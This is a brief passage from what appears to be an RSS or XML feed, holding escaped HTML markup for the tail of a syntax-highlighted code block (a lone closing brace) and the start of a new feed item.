+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
     </item>
     
     <item>
